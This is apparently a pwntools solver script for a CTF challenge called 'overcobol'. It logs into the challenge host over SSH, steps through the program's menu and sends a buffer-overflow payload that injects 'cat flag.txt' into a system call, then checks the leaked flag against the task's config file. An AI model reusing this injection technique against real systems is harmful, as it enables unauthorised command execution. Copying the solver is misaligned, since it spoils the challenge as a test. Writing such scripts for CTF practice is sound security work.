from pwn import *
import os

keyfile = "keys/id_rsa"
if os.getenv("DEV") == "1":
    host = "localhost"
else:
    host = "overcobol.ctf.insecurity-insa.fr"

s = ssh(user="user", host=host, port=2224, keyfile=keyfile)
sh = s.shell()

payload = "AAAAAAAAAABBcat flag.txt        system"

def get_menu(sh):
    for _ in range(4):
        sh.readline()

get_menu(sh)
get_menu(sh)

sh.sendline("1")
sh.sendline("Henry")
sh.readline()
sh.readline()

sh.sendline(payload)
sh.readline()

sh.sendline("1")
sh.readline()

sh.sendline("2")
sh.readline()

get_menu(sh)
sh.sendline("3")
sh.readline()
sh.readline()
sh.readline()
flag = sh.readline().decode()
print("FLAG found =", flag)
sh.readline()
sh.readline()
get_menu(sh)

sh.sendline("4")
sh.readline()

import re
actual_flag = re.findall(r'INSA{.*}', open('../.mkctf.yml').read())[0]
assert actual_flag in flag
